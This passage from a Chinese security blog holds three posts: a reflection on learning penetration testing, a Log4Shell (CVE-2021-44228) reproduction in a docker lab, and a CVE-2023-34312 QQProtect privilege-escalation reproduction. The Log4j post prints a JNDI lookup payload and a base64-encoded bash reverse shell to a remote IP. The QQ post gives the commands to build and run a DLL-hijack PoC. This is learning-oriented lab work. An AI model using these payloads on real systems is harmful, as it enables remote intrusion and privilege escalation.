始呢还是看完漏洞原理然后像以前一样去ctf刷几道题还是找代码来直接上手审计呢。缺少了知识体系的构建，日站变得尤为困难。</p><p>于是在反复的SRC挖掘尝试的过程中，我终于破防了，遇到了一个正常得不能再正常的站点，终点抓POST包随便测测参数，发现大多数不存在的参数都是返回No this method之类的json消息，但是在其中一些(其实也不存在这些参数)情况却返回了一整个404页面，并且看到了ezEIP5.0的字样，搜索啊发现原来是万户的，发现ezEIP5.0有个XSS的CVE，不过没人复现，也找不到一点相关的资料，这么大个魔改的ezEIP(估计是定制的)，不说是不是真有XSS，能在哪里触发我也找不到啊。不测了，关机睡觉。</p><p>基本上我的日站都是这个过程，总结下来可能是空学会了L神的手法了，但是不明白手法背后的意义和原理，只是机械的模仿罢了。</p><p>最近还在不断地被失眠折磨，晚上睡不着觉宿舍还断电，躺在床上除了刷短视频啥也干不了，不然就是听音乐看抽象，任由情绪被虚拟调动，直到五点半天早早亮，来电了继续下床开电脑，日站吧没睡着感觉头疼日不下去，玩游戏吧玩不下去，开着galgame进度半天也推进不动。实在是受够这样的日子了。这一年我一定要成为网安中级高手。</p><h2 id="正题"><a href="#正题" class="headerlink" title="正题"></a>正题</h2><p>扯了这么多，其实这次要记录的也只是几个经常遇到但是不太理解的概念。跟cms,oa,sso有关，它们的名字，作用或许很容易理解，但是为何在渗透工作中时常要对这几个东西保持关注，为何有时发现的某些oa版本就已经一把梭了，这些背后的联系对于我来说才是难以轻易理解的。</p><p>oa，即Office Automation(办公自动化)，在企业中常见，通常包括电子邮件，日程安排，文档管理等功能，用于帮助企业更高效地处理办公事务。</p><p>cms，即Content Management System,内容管理系统，用于网站管理人员能够更轻松地管理网站内容，包括文本，图像，视频等，在网站开发和维护中起重要作用</p><p>sso，即Single Sign On,单点登录，一种身份验证和凭据控制的机制，允许用户在登录一次之后访问多个相关系统，而不需要在每个系统中都输入凭证。</p><p>按照概念解释的话就是这样，很难看出到底为什么它们在渗透工作中能得到如此之高的关注度，但也不是不能理解，oa的话估计是漏洞比较多，谁会不喜欢漏洞多又被大规模使用的系统呢，就像我操着msf进了一堆有ms17010的内网一样，国内众多集成工具包中都集成了各个厂家oa的漏洞利用工具，只要版本与利用条件对应得上，基本就是一把梭，上马准备进内网阶段就完事，估计这类的漏洞也只是在hvv的时候有价值，平常的漏洞挖掘的话都不一定会遇上类似的场景，倒不是说没有，可能只是别人早挖过一遍了怎么可能轮得到我。漏洞挖掘的话估计会偏向于在已有相关代码的情况下进行代审的场景。</p><p>而cms,按照我的观察与推测也是差不多，虽然没看到像各大oa的直接的利用工具，但是似乎存在一些渗透的固定思路，找路径之类的，推测来说可能是挖漏洞和攻击渗透的时候都得注意，不过说是挖漏洞，到底是哪方面的漏洞也不好说，是xss还是csrf或者ssrf,还是rce呢都不好说。</p><p>sso，估计毫无疑问是属于代审的范畴了，只要能够拿下sso，我都不敢想了，连带的使用sso的系统估计都得被拿下，不说能getshell吧，起码管理员账号是拿下了，这个也不好说一定是属于挖漏洞的范畴，如果有大佬现场代审然后利用呢？或者人家本来就留着当0day了，不管是hvv的时候派上用场还是直接转卖可能比厂商给的钱多也不一定。</p><h2 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h2><p>其实吧，写这些莫名其妙的东西还是有点收获的，不同于内网渗透环节，你或许可以对那些shellcode，那些攻击的payload一无所知，就像我用着ms17010但是丝毫不知道它的具体细节，只知道反正跟smb本身的漏洞有关，只要知晓了msf那几个模块的使用方法，要用的工具的条件，基本上也能打得似乎有模有样，打得很爽，再加上一点网工的基本原理，也就能熟练使用代理隧道，中转监听器之类的横向技巧，但是要进军打点工作，要对这些漏洞的原理有一定的了解，或者说，要对漏洞有一定的研究，起码L神肯定是这样，他电脑里这些漏洞的相关学习和总结笔记是很多的，有机会真想全部下下来好好研究。我也不知道他对于这些漏洞是什么个研究步骤，大概是先了解漏洞的原理，然后尝试对这类漏洞进行专项挖掘，再结合自己挖掘过程中遇到的不同情况进行相关的总结，记录感悟，最后归档到自己的笔记里，下一次要用的时候直接翻出笔记用就完了，虽然可能不记得相关的具体命令，但是具体的步骤和命令都记录在笔记里，且原理已经被自己摸透了，那么无论是现场的挖掘还是利用都显得有迹可循了。</p><p>接下来就是跟着总结下来的学习路线去学习具体的漏洞然后去做一些专项挖掘了，不过还有一个问题：L神当时刚开始专项挖掘的的时候是怎么知道哪些站点能有这个漏洞哪些没有的呢，我倒希望这只是我万事开头难的小小疑问，而不是路线错误，不然就难搞了。</p>]]></content>
    
    
    
    <tags>
      
      <tag>网安</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CVE-2021-44228复现</title>
    <link href="/2023/08/01/CVE-2021-44228/"/>
    <url>/2023/08/01/CVE-2021-44228/</url>
    
    <content type="html"><![CDATA[<h1 id="CVE-2021-44228-Apache-Log4j-复现"><a href="#CVE-2021-44228-Apache-Log4j-复现" class="headerlink" title="CVE-2021-44228 (Apache Log4j)复现"></a>CVE-2021-44228 (Apache Log4j)复现</h1><hr><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>因为鄙人才疏学浅，而且专注时间太短，一直不太知道到底要复现一些什么漏洞才能提升自己的打点水平，只能先挑这些大家都耳熟能详的漏洞来尝试复现了。</p><p>遥想2021Log4j漏洞刚放出poc，各个我关注的网安up主都在发复现视频，不过当时我应该是刚高考完没多久，或者是大一，对于网安属于是一种随时准备脱离的边缘状态，不过自己一直也不混什么圈子，真走了估计连0.00001%的世界线变动都不会产生，而且当时还没接触hw，就连那点脚本小子的活都用不明白了估计。扯远了，不过我一直以为这个漏洞蛮新的，没想到已经整整两年了，真是岁月如梭。</p><h2 id="漏洞背景-原理"><a href="#漏洞背景-原理" class="headerlink" title="漏洞背景&amp;原理"></a>漏洞背景&amp;原理</h2><p>“Apache Log4j是基于java的日志记录组件，被广泛应用于业务系统开发。”我对java唯一的开发经验就只是之前尝试过和朋友写一个Minecraft的mod，不过当年Log4j漏洞刚披露的时候确实有关于mc服务器因为Log4j漏洞被入侵的消息。</p><p>受影响的组件:</p><ul><li>Spring-boot-strater-log4j2</li><li>Apache Solr</li><li>Apache Flink</li><li>Apache Druid</li></ul><p>眼熟的只有solr和druid，不过也仅是眼熟，solr是在一次hw里面通过扫描得到内网的一台linux机器上似乎有solr相关的漏洞，然后用msf搜了个solr直接用exploit一把梭了(唉，脚本小子)，druid是之前打ctf的时候出过一提相关的，不过利用方法什么的也全忘了。</p><hr><p>看了半天我也没想好怎么组织语言描述它的原理，先提取几个关键词出来: JNDI(Java Name and Directory Interface),LDAP(Lightweight Directory Protocol),RMI(Remote Method Invoke)，大概是说,log4j有个lookup功能的实现类JNDI实现类Jndilookup存在设计缺陷，导致于使用了JNDI接口的应用都存在被RCE的可能。</p><p><img src="/img/image-20230731161038556.png" alt="image-20230731161038556"></p><p>log4j的lookup功能可以快速打印运行应用容器的docker属性，环境变量，日志事件，Java应用程序环境信息等内容。</p><p>首先是__org.apache.logging.log4j.core.pattern.MessagePatternConverter#format__ </p><p><img src="/img/image-20230731225911225.png" alt="image-20230731225911225"></p><p>此处是找的log4j2.2版本源码，写法上可能与其他版本不太一样，但是同样存在漏洞。</p><p>我们传入的message会通过<code>MessagePattenConverter.format()</code>，如果<code>config</code>存在且<code>noLookups</code>未false(此处似乎并未出现，不过反正noLookups默认就是false)，再匹配到${开头则替换原有字符串，我们在此处构造payload。</p><p>另外是<code>org.apache.logging.log4j.core.lookup.Interpolator#lookup</code></p><p><img src="/img/image-20230731230716457.png" alt="image-20230731230716457"></p><p>此处是说log4j在处理event的时候是根据前缀选择对应的<code>StrLookup</code>进行处理的比如，date,jndi,java,main等，如果event是jndi,就能通过jndi注入导致RCE，大概吧，没了解过jndi注入，等我了解了相关的知识再回来补。</p><h2 id="复现过程"><a href="#复现过程" class="headerlink" title="复现过程"></a>复现过程</h2><h3 id="dnglog验证漏洞"><a href="#dnglog验证漏洞" class="headerlink" title="dnglog验证漏洞"></a>dnglog验证漏洞</h3><p>通过docker拉取漏洞镜像<em>vulfocus&#x2F;log4j2-rce-2021-12-09:latest</em>并启动。</p><p><img src="/img/image-20230731232426957.png" alt="image-20230731232426957"></p><p>点击链接会发送payload，我们使用hackbar构造payload:<code>$&#123;jndi:ldap://4zjth6.dnslog.cn&#125;</code>来验证是否存在漏洞。(payload要进行url编码)</p><p><img src="/img/image-20230731232601564.png" alt="image-20230731232601564"></p><p><img src="/img/image-20230731232615226.png" alt="image-20230731232615226"></p><p>成功执行。</p><h3 id="jndi注入反弹shell"><a href="#jndi注入反弹shell" class="headerlink" title="jndi注入反弹shell"></a>jndi注入反弹shell</h3><p>下载<a href="https://github.com/welk1n/JNDI-Injection-Exploit/releases/tag/v1.0%E6%90%AD%E5%BB%BA%E8%99%9A%E5%81%87ldap,rwi%E6%9C%8D%E5%8A%A1">https://github.com/welk1n/JNDI-Injection-Exploit/releases/tag/v1.0搭建虚假ldap,rwi服务</a></p><p>命令为&#96;&#96;</p><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs dust"><span class="language-xml">java -jar /JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C &quot;bash -c </span><span class="hljs-template-variable">&#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMTIuNzQuMTI2LjIwMC81OTg1Mi</span><br><span class="hljs-template-variable">AwPiYx&#125;</span><span class="language-xml">|</span><span class="hljs-template-variable">&#123;base64,-d&#125;</span><span class="language-xml">|</span><span class="hljs-template-variable">&#123;bash,-i&#125;</span><span class="language-xml">&quot; -A 112.74.126.200</span><br></code></pre></td></tr></table></figure><p>使用-C传入需要执行的命令，似乎一定要base64编码后才可以，此处为<code>bash -i &gt;&amp; /dev/tcp/112.74.126.200/59852 0&gt;&amp;1</code>的base64编码。-A传入虚假服务的服务器ip</p><p><img src="/img/image-20230801001712984.png" alt="image-20230801001712984"></p><p>复制提供的url:<code>rmi://112.74.126.200:1099/fxpa7c</code>构造payload</p><p><img src="/img/image-20230801002923020.png" alt="image-20230801002923020"></p><p>成功反弹，不过不知道为什么成功率非常之低，成功过一次之后我修改了一点参数之后就再也没法复现了，真是奇怪了。</p>]]></content>
    
    
    
    <tags>
      
      <tag>网安</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CVE-2023-34312复现</title>
    <link href="/2023/07/26/CVE-2023-34312/"/>
    <url>/2023/07/26/CVE-2023-34312/</url>
    
    <content type="html"><![CDATA[<h1 id="CVE-2023-34312漏洞复现"><a href="#CVE-2023-34312漏洞复现" class="headerlink" title="CVE-2023-34312漏洞复现"></a>CVE-2023-34312漏洞复现</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>最近在练习内网渗透相关，在之前hw的时候发现只会msf+ms17010的自己在内网或许能够一把梭，但是后渗透阶段的各种操作自己都不熟悉，一旦没有了ms17010自己就傻了眼，自诩网络安全有些经验的自己结果也只是个脚本小子的事实实在是令人懊恼，但经验与实力是积累起来的，在此先从漏洞复现开始吧，之前也做过某些漏洞的复现，但大多都没有留下笔记记录，那么作为第一篇复现笔记，就从<em>CVE-2023-34312</em>提权漏洞开始吧，一点是利用起来比较简单<em>(因为我不会逆向，所以照着利用起来的话就只是编译一个dll的事)</em>，一个是在国内的内网环境下也许会遇到相关的情况，毕竟QQ在PC上的安装概率还是很大的。</p><hr><h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>额，这个其实没什么好说的，毕竟我不是逆向选手，我只知道是因为有两个可供操作的指针a1和v3，然后大佬们提供了ROP链子的poc，我只管编译和使用。</p><h2 id="复现过程"><a href="#复现过程" class="headerlink" title="复现过程"></a>复现过程</h2><p>使用<code>cargo +stable-i686-pc-windows-msvc build --release --config &quot;build.rustflags = [\&quot;-C\&quot;, \&quot;target-feature=+crt-static\&quot;]&quot;</code>对poc进行编译，因为大佬用的是rust写的，所以还要配置rust编译环境。</p><p><img src="/img/image-20230726154739765.png" alt="image-20230726154739765"></p><p>主要是编译得到这两个dll: <em>evel.dll</em>和<em>tiniyxml.dll</em></p><p><img src="/img/image-20230726154905518.png"></p><p>好，然后就失败了，我真服了，这傻逼QQ重装一个版本把原来的删了不说，还利用失败了，我把这下面东西都删了再试试吧。</p><p><img src="/img/image-20230726155844157.png" alt="image-20230726155844157"></p><p>吗的，怎么还是失败了，再降低版本到9.7.6试试。</p><p>吗的。还是失败了，我直接下载大佬编译好的dll试试。</p><p>吗的。还是失败了，不玩了，关机睡觉。</p><p>吗的。一觉醒来换了win7虚拟机试了试还是失败。这下真是拌死在起跑线上了。</p><p>寄了，经过反复分析。我觉得这不是我的问题，应该是大佬写的问题，但是这有什么办法我只是一个脚本小子不懂逆向也不懂rust我也不会改呜呜呜呜呜。</p><p><img src="/img/image-20230726220714417.png" alt="image-20230726220714417"></p><p>看报错应该就是这一行出了问题，报错是找不到文件，指的应该就是这个.\pipe_QPIPC_PUB1015_了，但是我也不知道这是个什么啊，连路径都看不懂，呜呜呜呜呜。</p><p>又二十分钟之后，终于哦哦哦哦哦哦，成功了，原本预期二十分钟复现完毕的漏洞，我从早上一直干到了晚上。不过也是因为翻车，对于这个漏洞的原理理解得…额..算是深了一些吧。如果就像其他人的复现blog一样顺利，我感觉我都不会打开这个源代码瞧上一眼。话说我怎么干这行总是翻车，什么奇怪的翻车体制吗难道。</p><p><img src="/img/image-20230726223020312.png" alt="image-20230726223020312"></p><p>好，那么究竟是怎么回事呢。正如我上面提到的报错显示的那段代码，是打开了某个进程管道，而报错显示并不存在这个管道，结合我自然语言理解的代码，*(其实还得是chatgpt爹的帮助)* ，看来是管道的问题，我去下载了一个windows查看管道的工具<strong>Sysinternals Suite</strong></p><blockquote><p><a href="https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite">https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite</a></p></blockquote><p>稍加查看后发现</p><p><img src="/img/image-20230726223605464.png" alt="image-20230726223605464"></p><p>在初次安装的时候会自动启动QQ，此时QQProtect.exe(Q盾)会伴生启动，然而因为看其他人的复现过程都说的是将编译生成的两个dll<strong>复制</strong>到QQProtect.exe所在的文件夹中，一般是在<code>C:\Program Files (x86)\Common Files\Tencent\QQProtect\Bin</code>，这样的话就会产生一个问题，就是tinyxml.dll是涉及到替换的，而在Q盾活动的过程中tinyxml.dll是被占用的，无法完成替换，所以我就想着把Q盾的进程杀掉，从而导致了一个<strong>大问题</strong>。我没有发现这之后Q盾程序就再也起不来了，于是管道也就不存在。</p><p><img src="/img/image-20230726224107842.png" alt="image-20230726224107842"></p><p>而且不光是这样，杀掉Q盾进程之后不管有没有替换tinyxml.dll，还是启不启动QQ，Q盾进程的莫名的没法再起来了。所以正确的使用方法应该是找另外一个目录，在确定Q盾进程存在的情况下把QQProtect.exe复制到编译得到的两个dll同文件下，并且运行<code>QQProtect.exe evil.dll</code>，这样才能成功的提权。</p><h2 id="结尾"><a href="#结尾" class="headerlink" title="结尾"></a>结尾</h2><p>这通乌龙终于是结束了，起码下次再有hw没准能遇到这样的场景，起码不会再翻车了。希望等这阵子忙完了自己能去学一学msf的实现和ruby，把CVE-2023-34312搞成提权脚本，唉，如果真有那么一天，估计我也能早日脱离脚本小子的境地吧。</p>]]></content>
    
    
    
    <tags>
      
      <tag>网安</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
